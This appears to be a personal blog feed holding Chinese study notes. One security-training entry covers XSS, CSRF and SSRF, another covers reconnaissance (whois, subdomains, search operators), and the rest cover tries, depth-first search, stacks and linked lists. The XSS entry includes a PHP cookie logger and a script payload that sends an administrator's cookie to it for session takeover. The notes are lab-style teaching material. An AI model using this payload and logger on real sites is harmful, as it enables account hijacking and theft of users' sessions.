<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><p>黑客向服务器提交一个请求【带有XSS代码】，服务器后台php处理这段代码【包括XSS代码】，然后服务器后台将处理好的页面发给黑客【包括XSS异常情况】。</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>黑客向服务器提交一个请求【带有XSS代码】，服务器将请求【包括XSS代码】存储到数据库里【所以当时不会有反应】，当下次访问此数据库对象时，会发生XSS异常情况。</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>不发给服务器，仅在浏览器端操作。当存在document.url，document.write等属性时。</p>
<h4 id="例子：获取留言板管理员的cookie"><a href="#例子：获取留言板管理员的cookie" class="headerlink" title="例子：获取留言板管理员的cookie"></a>例子：获取留言板管理员的cookie</h4><p>首先写一个getCookie.php，内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(file_put_contents(<span class="string">"cookie.txt"</span>,<span class="string">'Cookie:'</span>.$_GET[<span class="string">'cookie'</span>],<span class="string">'Location:'</span>.$_GET[<span class="string">'durl'</span>],FILE_APPEND))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在留言板内输入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="built_in">document</span>.location.href=<span class="string">"http://127.0.0.1/getCookie.php?cookie="</span>+</span><br><span class="line">    <span class="built_in">document</span>.cookie+</span><br><span class="line">    <span class="string">"&amp;durl="</span>+</span><br><span class="line">    <span class="built_in">document</span>.url<span class="string">"   </span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时当管理员点开此留言时，他的url和cookie就会被发送到cookie.txt。</p>
<p>我们通过url，使用cookie quick manager等插件修改cookie来登入管理员后台。</p>
<h1 id="CSRF（cross-site-request-forgery）跨站请求伪造"><a href="#CSRF（cross-site-request-forgery）跨站请求伪造" class="headerlink" title="CSRF（cross-site request forgery）跨站请求伪造"></a>CSRF（cross-site request forgery）跨站请求伪造</h1><ol>
<li>黑客了解过一个页面1后，自己写了一个文件，里面主要代码为表单的提交，表单中包含页面1里你想要修改的数据。</li>
<li>黑客挂一个链接，链接到此页面。用户点击后，黑客即能利用用户的权限来实现一些东西【比如修改用户本人的密码】</li>
</ol>
<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/csrf.png" alt="csrf"></p>
<h1 id="SSRF（Server-side-request-forgery）服务器端请求伪造"><a href="#SSRF（Server-side-request-forgery）服务器端请求伪造" class="headerlink" title="SSRF（Server-side request forgery）服务器端请求伪造"></a>SSRF（Server-side request forgery）服务器端请求伪造</h1><p>黑客利用服务器A作为跳板去访问服务器B。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<h2 id="内网IP端口存活测试"><a href="#内网IP端口存活测试" class="headerlink" title="内网IP端口存活测试"></a>内网IP端口存活测试</h2><p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/ssrf.png" alt="ssrf"></p>
<p>其中ssrf_curl.php的代码是</p>
<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/ssrfphp.png" alt="ssrfphp"></p>
<p>其中关于curl的有关内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;php-ref-curl.html</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>米斯特安全培训</category>
      </categories>
  </entry>
  <entry>
    <title>树的深度优先搜索</title>
    <url>/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="树的深度优先搜索"><a href="#树的深度优先搜索" class="headerlink" title="树的深度优先搜索"></a>树的深度优先搜索</h1><h2 id="图论的一些概念"><a href="#图论的一些概念" class="headerlink" title="图论的一些概念"></a>图论的一些概念</h2><p>有向图：所有的边都是有向边</p>
<p>无向图：所有的边都是无向边</p>
<p>混合图：都有</p>
<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/1.jpg" alt="1"></p>
<p>出度：这个结点出去几条线</p>
<p>入度：这个结点进去几条线</p>
<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/2.jpg" alt="2"></p>
<p>通路：任意两点互相连通</p>
<p>回路：一条通路的起始点v1和终止点vn相同</p>
<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/3.jpg" alt="3"></p>
<p>树：没有简单回路的连通无向图</p>
<p>有向树：一种特殊的树，边是有向的，且满足：</p>
<ol>
<li>有且只有一个结点入向为0，这个结点称为根</li>
<li>除根以外的所有结点，入度都为1.从树根到任一结点有且只有一条有向通路</li>
</ol>
<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/4.jpg" alt="4"></p>
<h2 id="前缀树的构建和查询"><a href="#前缀树的构建和查询" class="headerlink" title="前缀树的构建和查询"></a>前缀树的构建和查询</h2><p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/5.jpg" alt="5"></p>
<p>可以在叶子结点上添加此单词的解释</p>
<h3 id="一些特殊情况"><a href="#一些特殊情况" class="headerlink" title="一些特殊情况"></a>一些特殊情况</h3><ol>
<li>还没有到叶子结点，单词就结束了。【比如entire和entirely】此时要判断此非叶子结点是否为单词，若不是则字典里无此单词。</li>
<li>搜索到叶子结点，仍无此单词，则字典里无此单词。</li>
<li>搜索到一半，未到叶子结点，被查单词也有未匹配的字母，但下一个结点也无法匹配。则字典里无此单词。</li>
</ol>
<h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><p>这种前缀树的查找即属于<strong>深度优先搜索</strong></p>
<h2 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h2><p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/6.jpg" alt="6"></p>
<p>使用“栈”来遍历前缀树</p>
<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/7.jpg" alt="7"></p>
<blockquote>
<p>第 1 步，将初始结点 110 压入栈中。<br>第 2 步，弹出结点 110，搜出下一级结点 123、879、945 和 131。<br>第 3 步，将结点 123、879、945 和 131 压入栈中。<br>第 4 步，重复第 2 步和第 3 步弹出和压入的步骤，处理结点 123，将新发现结点 162 和 587 压入栈中。<br>第 5 步，处理结点 162，由于 162 是叶子结点，所以没有发现新的点。第 6 步，重复第 2 和第 3 步，处理结点 587，将新发现结点 681 压入栈中。<br>……<br>第 n-1 步，重复第 2 和第 3 步，处理结点 131，将新发现结点 906 压入栈中。<br>第 n 步，重复第 2 和第 3 步，处理结点 906，没有发现新的结点，也没有更多待处理的结点，整个过程结束。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 使用栈来实现深度优先搜索</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfsByStack</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;(); </span><br><span class="line">    <span class="comment">// 创建堆栈对象，其中每个元素都是TreeNode类型</span></span><br><span class="line">  stack.push(root);    <span class="comment">// 初始化的时候，压入根结点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!stack.isEmpty()) &#123;  <span class="comment">// 只要栈里还有结点，就继续下去</span></span><br><span class="line">  </span><br><span class="line">  TreeNode node = stack.pop();  <span class="comment">// 弹出栈顶的结点</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (node.sons.size() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 已经到达叶子结点了，输出</span></span><br><span class="line">    System.out.println(node.prefix + node.label);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 非叶子结点，遍历它的每个子结点</span></span><br><span class="line">    Iterator&lt;Entry&lt;Character, TreeNode&gt;&gt; iter </span><br><span class="line">      = node.sons.entrySet().iterator();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 注意，这里使用了一个临时的栈stackTemp</span></span><br><span class="line">    <span class="comment">// 这样做是为了保持遍历的顺序，和递归遍历的顺序是一致的</span></span><br><span class="line">    <span class="comment">// 如果不要求一致，可以直接压入stack</span></span><br><span class="line">    Stack&lt;TreeNode&gt; stackTemp = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">    <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">      stackTemp.push(iter.next().getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stackTemp.isEmpty()) &#123;</span><br><span class="line">      stack.push(stackTemp.pop());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="用什么数据结构构建前缀树？"><a href="#用什么数据结构构建前缀树？" class="headerlink" title="用什么数据结构构建前缀树？"></a>用什么数据结构构建前缀树？</h2><blockquote>
<p>我们可以设计一个 TreeNode 类，表示有向树的结点和边。这个类需要体现前缀树结点最重要的两个属性。</p>
<ul>
<li><p>这个结点所代表的字符，要用 label 变量表示。</p>
</li>
<li><p>这个结点有哪些子结点，要用 sons 哈希映射表示。之所以用哈希，是为了便于查找某个子结点（或者说对应的字符）是否存在。</p>
<p>另外，我们还可以用变量 prefix 表示当前结点之前的前缀，用变量 explanation 表示某个单词的解释。和之前一样，为了代码的简洁，所有属性都用了 public，避免读取和设置类属性的代码。</p>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 前缀树的结点</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">char</span> label;  <span class="comment">// 结点的名称，在前缀树里是单个字母</span></span><br><span class="line">  <span class="keyword">public</span> HashMap&lt;Character, TreeNode&gt; sons = <span class="keyword">null</span>; <span class="comment">// 使用哈希映射存放子结点。哈希便于确认是否已经添加过某个字母对应的结点。</span></span><br><span class="line">  <span class="keyword">public</span> String prefix = <span class="keyword">null</span>;   <span class="comment">// 从树的根到当前结点这条通路上，全部字母所组成的前缀。例如通路b-&gt;o-&gt;y，对于字母o结点而言，前缀是b；对于字母y结点而言，前缀是bo</span></span><br><span class="line">  <span class="keyword">public</span> String explanation = <span class="keyword">null</span>;  <span class="comment">// 词条的解释</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 初始化结点</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">TreeNode</span><span class="params">(<span class="keyword">char</span> l, String pre, String exp)</span> </span>&#123;</span><br><span class="line">   label = l;</span><br><span class="line">   prefix = pre; </span><br><span class="line">   explanation = exp;</span><br><span class="line">   sons = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说到这里，你可能会好奇，为什么只有结点的定义，而没有边的定义呢？实际上，这里的有向边表达的是父子结点之间的关系，我把这种关系用 sons 变量来存储父结点。<br>需要注意的是，我们需要动态地构建这棵树。每当接收一个新单词时，代码都需要扫描这个单词的每个字母，并使用当前的前缀树进行匹配。如果匹配到某个结点，发现相应的字母结点并不存在，那么就建立一个新的树结点。这个过程不好理解，我也写了几行代码，你可以结合来看。其中，str 表示还未处理的字符串，parent 表示父结点。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; 处理当前字符串的第一个字母</span><br><span class="line">char c &#x3D; str.toCharArray()[0];</span><br><span class="line">TreeNode found &#x3D; null;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 如果字母结点已经存在于当前父结点之下，找出它。否则就新生成一个</span><br><span class="line">if (parent.sons.containsKey(c)) &#123;</span><br><span class="line">  found &#x3D; parent.sons.get(c);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  TreeNode son &#x3D; new TreeNode(c, pre, &quot;&quot;);</span><br><span class="line">  parent.sons.put(c, son);</span><br><span class="line">  found &#x3D; son;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>计算机与数学</category>
      </categories>
  </entry>
  <entry>
    <title>栈</title>
    <url>/2020/05/02/%E6%A0%88/</url>
    <content><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>一句话：后进者先出，先进者后出。</p>
<p>当某个数据集合只涉及在一端的插入和删除数据，并且满足后进先出、先进后出的特性，我们就应该首选“栈”这种数据结构。</p>
<h2 id="栈的实现"><a href="#栈的实现" class="headerlink" title="栈的实现"></a>栈的实现</h2><ul>
<li><p>顺序栈：用数组实现。</p>
</li>
<li><p>链式栈：用链表实现</p>
</li>
</ul>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基于数组实现的顺序栈</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayStack</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> String[] items;  <span class="comment">// 数组</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> count;       <span class="comment">// 栈中元素个数</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n;           <span class="comment">//栈的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化数组，申请一个大小为n的数组空间</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.items = <span class="keyword">new</span> String[n];</span><br><span class="line">    <span class="keyword">this</span>.n = n;</span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入栈操作</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">push</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 数组空间不够了，直接返回false，入栈失败。</span></span><br><span class="line">    <span class="keyword">if</span> (count == n) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 将item放到下标为count的位置，并且count加一</span></span><br><span class="line">    items[count] = item;</span><br><span class="line">    ++count;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 出栈操作</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 栈为空，则直接返回null</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 返回下标为count-1的数组元素，并且栈中元素个数count减一</span></span><br><span class="line">    String tmp = items[count-<span class="number">1</span>];</span><br><span class="line">    --count;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="栈的时间、空间复杂度分析"><a href="#栈的时间、空间复杂度分析" class="headerlink" title="栈的时间、空间复杂度分析"></a>栈的时间、空间复杂度分析</h2><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>在入栈是、出栈时，只需要1-2个临时变量存储空间，所以空间复杂度为：<strong>O(1)</strong>。</p>
<blockquote>
<p>注意，这里存储数据需要一个大小为 n 的数组，并不是说空间复杂度就是 <strong>O(n)</strong>。因为，这 n 个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要<strong>额外</strong>的存储空间。</p>
</blockquote>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>入栈、出栈只涉及个别操作，时间复杂度为：<strong>O(1)</strong>。</p>
<h2 id="支持动态扩容的顺序栈"><a href="#支持动态扩容的顺序栈" class="headerlink" title="支持动态扩容的顺序栈"></a>支持动态扩容的顺序栈</h2><p><img src="/2020/05/02/%E6%A0%88/%E5%8A%A8%E6%80%81%E6%89%A9%E5%AE%B9%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="动态扩容示意图"></p>
<h3 id="【动态扩容栈】时间复杂度分析"><a href="#【动态扩容栈】时间复杂度分析" class="headerlink" title="【动态扩容栈】时间复杂度分析"></a>【动态扩容栈】时间复杂度分析</h3><p><img src="/2020/05/02/%E6%A0%88/%E5%8A%A8%E6%80%81%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6.jpg" alt="动态时间复杂度"></p>
<p>假设开始时栈的大小为K：</p>
<ol>
<li>K次时间复杂度为O(1)的simple-push</li>
<li>1次时间复杂度为O(K)的扩容</li>
<li>（K-1）次时间复杂度为O(1)的simple-push【为啥是K-1不是K ？？？】</li>
<li>1次时间复杂度为O(2K)的扩容</li>
<li>…………</li>
</ol>
<p>按图示方法均摊，可得均摊时间复杂度为：O(1)。</p>
<h2 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h2><h3 id="栈在函数调用里的应用"><a href="#栈在函数调用里的应用" class="headerlink" title="栈在函数调用里的应用"></a>栈在函数调用里的应用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   int a &#x3D; 1; </span><br><span class="line">   int ret &#x3D; 0;</span><br><span class="line">   int res &#x3D; 0;</span><br><span class="line">   ret &#x3D; add(3, 5);</span><br><span class="line">   res &#x3D; a + ret;</span><br><span class="line">   printf(&quot;%d&quot;, res);</span><br><span class="line">   reuturn 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int add(int x, int y) &#123;</span><br><span class="line">   int sum &#x3D; 0;</span><br><span class="line">   sum &#x3D; x + y;</span><br><span class="line">   return sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/02/%E6%A0%88/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8.jpg" alt="函数调用"></p>
<p>我的理解：</p>
<ul>
<li>声明一个变量时【res=0】就相当于把数据压入栈中，而调用这个变量时【res=a+ret】就相当于将数据取出栈。</li>
<li>当我们在主函数里调用一个子函数时，压入栈的数据是先压主函数里的变量，再压子函数里的数据。出栈时也是先释放子函数里的变量。符合子函数先调用完先清除数据的规则【这一点我觉得有点类似于函数的<strong>递归调用</strong>】</li>
</ul>
<h3 id="栈在表达式求值里的作用"><a href="#栈在表达式求值里的作用" class="headerlink" title="栈在表达式求值里的作用"></a>栈在表达式求值里的作用</h3><h4 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h4><blockquote>
<p>实际上，编译器就是通过两个栈来实现的。其中<strong>一个保存操作数的栈</strong>，<strong>另一个是保存运算符的栈</strong>。我们从左向右遍历表达式，当遇到数字，我们就直接压入操作数栈；当遇到运算符，就与运算符栈的栈顶元素进行比较。<br>如果比运算符栈顶元素的优先级<strong>高</strong>，就将当前运算符压入栈；如果比运算符栈顶元素的优先级<strong>低或者相同</strong>，从运算符栈中取栈顶运算符，从操作数栈的栈顶取 2 个操作数，然后进行计算，再把计算完的结果压入操作数栈，继续比较。</p>
</blockquote>
<p><img src="/2020/05/02/%E6%A0%88/%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97.jpg" alt="四则运算"></p>
<h4 id="括号合法性检查"><a href="#括号合法性检查" class="headerlink" title="括号合法性检查"></a>括号合法性检查</h4><ol>
<li>从左至右依次扫描括号</li>
<li>扫描到<strong>左括号</strong>压入栈中</li>
<li>扫描到<strong>右括号</strong>，从栈顶取出左括号，相同则合法；不相同则不合法</li>
</ol>
<h4 id="浏览器的前进后退"><a href="#浏览器的前进后退" class="headerlink" title="浏览器的前进后退"></a>浏览器的前进后退</h4><ol>
<li>设置栈X和栈Y</li>
<li>浏览时，浏览的页面依次压入栈X</li>
<li>后退时，取X栈顶压入Y</li>
<li>前进时，取Y栈顶压入X</li>
</ol>
]]></content>
      <categories>
        <category>数据结构与算法之美</category>
      </categories>
  </entry>
  <entry>
    <title>mst_day1</title>
    <url>/2020/05/01/mst-day1/</url>
    <content><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;whois.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure>



<h2 id="大数据平台"><a href="#大数据平台" class="headerlink" title="大数据平台"></a>大数据平台</h2><p><img src="/2020/05/01/mst-day1/%E5%A4%A7%E6%95%B0%E6%8D%AE.png" alt="大数据"></p>
<h2 id="bing接口查询"><a href="#bing接口查询" class="headerlink" title="bing接口查询"></a>bing接口查询</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;bing.php</span><br></pre></td></tr></table></figure>

<h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>layer子域名挖掘机</p>
<h1 id="高级搜索引擎"><a href="#高级搜索引擎" class="headerlink" title="高级搜索引擎"></a>高级搜索引擎</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intitle:baidu.com</span><br><span class="line">inurl:baidu.com</span><br><span class="line">intext:baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/01/mst-day1/2.png" alt="2"></p>
<h1 id="网站服务器信息"><a href="#网站服务器信息" class="headerlink" title="网站服务器信息"></a>网站服务器信息</h1><ul>
<li>PING</li>
<li>多地PING</li>
<li>IP反查</li>
</ul>
<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><ul>
<li>URL编码：%+十六进制</li>
<li>Base64编码</li>
<li>HTML实体化编码：&amp;lt</li>
</ul>
<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>md5撞密</p>
<h1 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h1><p><img src="/2020/05/01/mst-day1/1.png" alt="1"></p>
]]></content>
      <categories>
        <category>米斯特安全培训</category>
      </categories>
  </entry>
  <entry>
    <title>链表</title>
    <url>/2020/04/30/%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="数组和链表的区别"><a href="#数组和链表的区别" class="headerlink" title="数组和链表的区别"></a>数组和链表的区别</h1><table>
<thead>
<tr>
<th></th>
<th>数组</th>
<th>链表</th>
</tr>
</thead>
<tbody><tr>
<td>内存存储空间</td>
<td>需要<strong>连续</strong>的内存空间来存储</td>
<td>通过指针将一组<strong>零散</strong>的内存块串联使用</td>
</tr>
<tr>
<td>插入、删除数据</td>
<td><strong>缺：</strong>为了保持数据连续性，要做大量数据搬移。时间复杂度为：<strong>O(n)</strong></td>
<td><strong>优：</strong>只需考虑相邻结点的指针改变。时间复杂度为：<strong>O(1)</strong></td>
</tr>
<tr>
<td>访问</td>
<td><strong>优：</strong>可以<strong>随机访问</strong>第k个元素。时间复杂度为：<strong>O(1)</strong></td>
<td><strong>缺：</strong>要<strong>遍历</strong>结点来找到目标结点。时间复杂度为：<strong>O(n)</strong></td>
</tr>
<tr>
<td>CPU缓存机制</td>
<td><strong>优：</strong>因为数组是连续的内存空间，可以借助CPU缓存机制，预读数组中的数据，<strong>访问数据效率更高</strong>。</td>
<td><strong>缺：</strong>不可以借助CPU缓存机制</td>
</tr>
<tr>
<td>大小固定</td>
<td><strong>缺：</strong>大小<strong>固定</strong>，改变大小需要将原来所有数据再复制过去，非常费时。</td>
<td><strong>优：</strong>支持动态扩容。</td>
</tr>
</tbody></table>
<blockquote>
<p>对于CPU缓存机制【转】</p>
<p>CPU在从内存读取数据的时候，会先把读取到的数据加载到CPU的缓存中。而CPU每次从内存读取数据并不是只读取那个特定要访问的地址，而是读取一个<strong>数据块</strong>(这个大小我不太确定。。)并保存到CPU缓存中，然后下次访问内存数据的时候就会先从CPU缓存开始查找，如果找到就不需要再从内存中取。这样就实现了比内存访问速度更快的机制，也就是CPU缓存存在的意义:为了弥补内存访问速度过慢与CPU执行速度快之间的差异而引入。</p>
<p>对于数组来说，存储空间是连续的，所以在加载某个下标的时候可以把以后的几个下标元素也加载到CPU缓存这样执行速度会快于存储空间不连续的链表存储。</p>
</blockquote>
<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/7.jpg" alt="7"></p>
<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/5.jpg" alt="5"></p>
<h1 id="几种链表"><a href="#几种链表" class="headerlink" title="几种链表"></a>几种链表</h1><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/6.jpg" alt="6"></p>
<p>头结点用来记录链表的基地址，尾结点指向一个空地址NULL</p>
<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/4.jpg" alt="4"></p>
<p>循环链表的尾结点指向链表的头结点</p>
<h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a><strong>优点：</strong></h3><p>适合处理具有环形结构的数据</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>约瑟夫问题</p>
<h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/3.jpg" alt="3"></p>
<p>比单链表多了一个prev前驱节点</p>
<p><strong>优点：</strong>支持双向遍历</p>
<p><strong>缺点：</strong>占用过多内存空间</p>
<blockquote>
<p>双向链表采用了<strong>用空间换时间</strong>的策略</p>
</blockquote>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="链表中的删除操作"><a href="#链表中的删除操作" class="headerlink" title="链表中的删除操作"></a>链表中的删除操作</h4><h5 id="删除结点中“值等于某个给定值”的结点"><a href="#删除结点中“值等于某个给定值”的结点" class="headerlink" title="删除结点中“值等于某个给定值”的结点"></a>删除结点中“值等于某个给定值”的结点</h5><p>单链表和双向链表都要遍历，时间复杂度均为：O(n)。</p>
<h5 id="删除给定指针指向的结点"><a href="#删除给定指针指向的结点" class="headerlink" title="删除给定指针指向的结点"></a>删除给定指针指向的结点</h5><p>单链表：找到了要删除的结点，但不支持访问前驱节点，又要从头遍历，直到p-&gt;next=q 。时间复杂度：O(n)。</p>
<p>双向链表：找到了要删除的结点，直接用前驱节点删除。时间复杂度：O(1)。</p>
<h4 id="链表中的查询操作【对于有序链表】"><a href="#链表中的查询操作【对于有序链表】" class="headerlink" title="链表中的查询操作【对于有序链表】"></a>链表中的查询操作【对于有序链表】</h4><p>双向链表可以通过数据的大小决定往前还是往后查询，省去一半的时间。</p>
<h2 id="双向循环链表"><a href="#双向循环链表" class="headerlink" title="双向循环链表"></a>双向循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/2.jpg" alt="2"></p>
<h1 id="链表的实际应用场景"><a href="#链表的实际应用场景" class="headerlink" title="链表的实际应用场景"></a>链表的实际应用场景</h1><p>几种缓存淘汰机制</p>
<ol>
<li>先进先出【FIFO：First In，First Out】</li>
<li>最少使用策略【LFU：Least Frequently Used】</li>
<li>最近最少使用策略【LRU：Least Recently Used】</li>
</ol>
